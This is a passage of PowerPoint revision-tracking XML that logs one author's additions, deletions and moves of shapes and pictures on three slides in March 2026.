            <ac:spMk id="43" creationId="{3794322B-9D2C-43A5-105D-5555C57B6250}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:59:27.140" v="1032" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="45" creationId="{479C09BB-F0AA-35F0-29ED-3496B0E8E9FD}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="46" creationId="{23F05445-B03D-AE72-B766-154933444838}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="47" creationId="{5C1D3D73-0FF2-1F7A-ADDC-154780729786}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="48" creationId="{EB8DE7F7-7812-00E5-0711-B93EA4A0D917}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="49" creationId="{C2E70E37-0998-3069-E749-FCA6ED5A8E08}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:00:01.431" v="1036" actId="164"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="52" creationId="{13272122-CD4C-4E7E-AC0F-9D70C2F8DD58}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="53" creationId="{1D533425-B4BD-08DF-BB41-340C494854B3}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="54" creationId="{B847DAED-2F81-786A-0B4B-4A47F558B450}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:00:01.431" v="1036" actId="164"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="55" creationId="{61148511-D8B2-BB91-0E28-9C055616577F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:00:01.431" v="1036" actId="164"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="56" creationId="{51BD562F-DD30-0004-3282-5B664B63F86C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:grpChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:59:17.660" v="1029" actId="165"/>
          <ac:grpSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:grpSpMk id="51" creationId="{6928291E-98FB-CDBB-85B9-3AA3A32203E8}"/>
          </ac:grpSpMkLst>
        </pc:grpChg>
        <pc:picChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:00:01.431" v="1036" actId="164"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:picMk id="17" creationId="{40FF45BD-4519-C4F0-E7BD-AF205AE836B9}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:00:01.431" v="1036" actId="164"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:picMk id="22" creationId="{A8C255C2-71DA-5B95-313B-CAFF65879D6B}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:59:36.035" v="1035" actId="1038"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:picMk id="1026" creationId="{3CF3C47A-7E11-679F-092E-020C75B2547B}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:47:21.692" v="1178" actId="1038"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3026875320" sldId="316"/>
        </pc:sldMkLst>
        <pc:spChg chg="add">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:02.317" v="1160"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="19" creationId="{F5502531-920F-4E8C-2BFC-4E7E4C3C671C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:05.851" v="1161"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="22" creationId="{677B8BD4-3054-71A1-B12C-6C5EC0509404}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:58.930" v="1169" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="29" creationId="{5CBD9496-9432-25CD-655B-969E8D973BCB}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:48.792" v="1167" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="39" creationId="{2F787D6D-1C0B-8718-370E-57AF505F9D75}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:48.792" v="1167" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="40" creationId="{7BB3638C-54CA-88E2-D7CA-8E407763A179}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:48.792" v="1167" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="41" creationId="{6463EAAD-B0E0-149E-1F8F-7C1D2763E5AA}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:48.792" v="1167" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="42" creationId="{0A9C52EE-4656-9509-7A12-B253FB37B0DC}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod ord">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:47:07.772" v="1172" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:spMk id="78" creationId="{C6A442BA-1FD9-6E28-CD38-5B1BA2870456}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:grpChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:48.792" v="1167" actId="165"/>
          <ac:grpSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:grpSpMk id="20" creationId="{5AD7F316-BBB8-4840-8364-AB6CB0575D44}"/>
          </ac:grpSpMkLst>
        </pc:grpChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:40:21.237" v="1104" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="14" creationId="{EA180BEB-8554-AEBF-C33A-5F5088EB6020}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:35:08.185" v="1078" actId="14100"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="18" creationId="{76A776C1-4A94-23C1-CE20-F9FCC16590DF}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:46:18.851" v="1164" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="28" creationId="{FF72C2C9-1D1E-6CE3-15C4-1DA060670FA1}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:35:58.476" v="1083" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="57" creationId="{C1C2A24E-5F96-14AE-E559-4DF36A0CA021}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:36:46.384" v="1088" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="59" creationId="{BAC37B9B-FB6C-FE34-1DCC-C5F5BF050C02}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:36:47.197" v="1089" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="61" creationId="{A8C06273-AFDA-9761-FB85-F5EF8CE57C40}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:34:12.468" v="1067" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="63" creationId="{C16DDC50-C5E3-DF5C-BE39-CAEBAA54026D}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:34:11.435" v="1066" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="65" creationId="{2BD4E63A-533B-42CF-DBAE-E27E30EBFDE0}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:34:16.396" v="1068" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="66" creationId="{CE2C80EF-85D3-94E7-1F83-98C061B9C47E}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:38:13.570" v="1101" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="67" creationId="{EC65003D-5B9D-1DB8-2BC8-257C6EDEBCEA}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:37:36.875" v="1093" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="69" creationId="{8BC903D6-4FAB-1238-33FA-40699BA8CA58}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:34:17.642" v="1069" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="71" creationId="{E78B4849-BEED-85BA-5940-47DA19C9D0B9}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:34:20.162" v="1070" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="72" creationId="{962AE795-8E1B-D833-877C-A7CB760A00D4}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:34:20.750" v="1071" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="73" creationId="{670EA4D5-5F81-06E6-08E6-8FBEE7608753}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:33:48.578" v="1063" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="75" creationId="{6E5FE073-2338-933B-178B-FF022519A7D5}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:38:12.653" v="1100" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="76" creationId="{3599C527-65FA-0B8E-676F-FB9019262491}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:40:40.337" v="1108" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="77" creationId="{0E28A6FD-F10E-02BB-944D-6E813571B07E}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:35:16.730" v="1080" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2050" creationId="{109E35DB-5F96-4C55-0B93-A163BCDA92C9}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:40:26.979" v="1106" actId="1036"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2052" creationId="{BAF193DB-DF2B-5A54-F545-EA241C0BB8CE}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:37:12.511" v="1092" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2054" creationId="{C87DE1F6-255A-83BA-176C-1BFFD4F8227E}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:40:32.529" v="1107" actId="14100"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2056" creationId="{2EFAE963-4F01-93FB-3860-0A0B7688FD07}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:42:06.697" v="1118" actId="14100"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2058" creationId="{482D7D03-B18A-D32F-89E1-5C7863E97D06}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:42:42.465" v="1123" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2060" creationId="{F5765C91-A6ED-2C66-DCD2-DE19060CC5E1}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:43:21.308" v="1134" actId="1037"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2062" creationId="{88BE1F31-DABC-A9BA-E8C9-44F6EFA4D196}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:47:21.692" v="1178" actId="1038"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2064" creationId="{7D9330A1-A780-B9C9-95A3-565BCA5F6D10}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:44:52.586" v="1146" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2066" creationId="{833CC05A-14AA-9103-1E83-4BF840A69BB5}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:45:23.902" v="1159" actId="1035"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2068" creationId="{9AC3CB01-85D5-FB3E-96F8-4AF651FBCA44}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:47:16.621" v="1176" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3026875320" sldId="316"/>
            <ac:picMk id="2074" creationId="{22BD7BC8-9FE6-C87D-8326-8CA7F4BB93F8}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1319616678" sldId="318"/>
        </pc:sldMkLst>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:spMk id="12" creationId="{51706A90-0194-973A-76F5-3D2694F956B5}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:spMk id="13" creationId="{B3D3AD01-9655-91E0-4049-3337FAC56D6F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:spMk id="15" creationId="{ACD6D345-3C70-4FCD-7D2A-ABBCF44CD7A9}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:spMk id="17" creationId="{15797AA1-9C78-677B-78FF-1E08E3F185EB}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:spMk id="18" creationId="{2DD091E7-A0B1-A819-D8FD-E8D284FE7BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
